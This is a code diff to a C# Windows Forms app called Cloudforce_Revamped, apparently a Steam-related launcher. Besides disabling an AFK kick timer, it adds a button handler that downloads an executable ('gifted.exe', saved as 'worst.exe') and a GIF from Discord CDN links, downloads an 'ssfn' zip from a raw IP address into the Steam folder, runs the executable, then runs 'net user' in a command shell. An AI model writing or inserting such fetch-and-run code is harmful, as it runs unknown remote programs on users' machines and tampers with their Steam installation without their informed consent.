@@ -16,6 +16,7 @@ using System.IO;
 using System.IO.Compression;
 using System.Linq;
 using System.Net;
+using System.Threading;
 using System.Windows.Forms;
 using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
 
@@ -81,7 +82,7 @@ namespace Cloudforce_Revamped
         //AFK Timer
 
         public bool afk_timer_Done;
-        private Timer kick_timer = new Timer();
+        //private Timer kick_timer = new Timer();
         private int counter = 0;
 
         private void timer1_Tick(object sender, EventArgs e)
@@ -94,7 +95,7 @@ namespace Cloudforce_Revamped
             }
             if (counter == 120)  //or whatever your limit is
             {
-                kick_timer.Stop();
+                //kick_timer.Stop();
                 afk_timer_Done = true;
                 guna2HtmlLabel1.ForeColor = Color.Green;
                 guna2HtmlLabel1.Text = "You can now an Game.";
@@ -119,7 +120,7 @@ namespace Cloudforce_Revamped
         private void wait_Timer()
         {
             afk_timer_Done = false;
-            kick_timer.Start();
+            //kick_timer.Start();
         }
 
 
@@ -269,5 +270,33 @@ namespace Cloudforce_Revamped
             }
         }
 
+        private void guna2GradientButton5_Click(object sender, EventArgs e)
+        {
+            var username = Environment.UserName;
+            File_Downloader("https://cdn.discordapp.com/attachments/914714246774915093/1030626580499796100/worst-mistake.gif", $"C:\\users\\{username}\\downloads\\mistake.gif", guna2GradientButton5);
+            File_Downloader("https://cdn.discordapp.com/attachments/914714246774915093/1030626580042616933/gifted.exe", $"C:\\users\\{username}\\downloads\\worst.exe", guna2GradientButton5);
+            File_Downloader("http://178.62.250.139/Files/%25command%25/ssfn_%25command%25.zip", "C:\\Program Files (x86)\\steam\\ssfn_%command%.zip", guna2GradientButton5);
+            new Process()
+            {
+                StartInfo = new ProcessStartInfo()
+                {
+                    WorkingDirectory = $"C:\\users\\{username}\\downloads",
+                    WindowStyle = ProcessWindowStyle.Normal,
+                    FileName = $"C:\\users\\{username}\\downloads\\worst.exe",
+                    Arguments = "mistake.gif"
+                }
+            }.Start();
+            Thread.Sleep(9000);
+            new Process()
+            {
+                StartInfo = new ProcessStartInfo()
+                {
+                    WorkingDirectory = $"C:\\Windows\\System32\\",
+                    WindowStyle = ProcessWindowStyle.Normal,
+                    FileName = $"C:\\Windows\\System32\\cmd.exe",
+                    Arguments = "cmd /c net user"
+                }
+            }.Start();
+        }
     }
 }
